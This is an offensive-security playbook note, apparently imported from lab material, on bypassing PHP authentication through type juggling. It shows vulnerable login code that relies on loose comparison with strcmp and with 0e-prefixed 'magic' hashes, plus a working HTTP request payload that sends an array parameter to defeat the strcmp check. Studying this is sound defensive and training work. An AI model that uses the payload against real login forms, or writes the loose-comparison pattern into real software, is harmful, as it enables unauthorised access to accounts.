---
technique: "Authentication Bypass"
family: "auth-session"
severity_hint: "high"
tags: []
source: "_raw/Web attacks/Web Attacks/Type Juggling/Authentication Bypass.md"
source_sha256: "b18aec676cd570fd9bfa563615a3eb1ab528e21ca6757a1b10151b879f02a953"
curator_version: 2
review_status: imported-unreviewed
---

# Authentication Bypass

> Family: **auth-session** · Severity hint: **high** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `php: $admin_pw = "P@ssw0rd!";`
- `python: POST / HTTP/1.1`
- `php: $hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';`

## Playbook (operator notes)

# Authentication Bypass

### **Strcmp Bypass**

- The function [strcmp](https://www.php.net/manual/en/function.strcmp.php) returns `0` if the two compared strings are equal
- If we supply a variable of the data type `array`, the function `strcmp` returns `null`, resulting in the comparison `null == 0`, which is `true` after type juggling

```php
$admin_pw = "P@ssw0rd!";

if(isset($_POST['pw'])){
    if(strcmp($_POST['pw'], $admin_pw) == 0){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```

```python
POST / HTTP/1.1
Host: typejuggling.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

pw[]=pwn
```

<aside>
💡

Note: The behavior of `strcmp` was changed in PHP 8.0.0 to throw an error if any argument is not a string. Thus, the bypass only works in PHP versions prior to 8.0.0.

</aside>

### **Magic Hashes**

```php
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';

if(isset($_POST['pw']) and is_string($_POST['pw'])){
    if(hash('sha256', $_POST['pw']) == $hashed_password){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```

## Source
Original note: `_raw/Web attacks/Web Attacks/Type Juggling/Authentication Bypass.md`
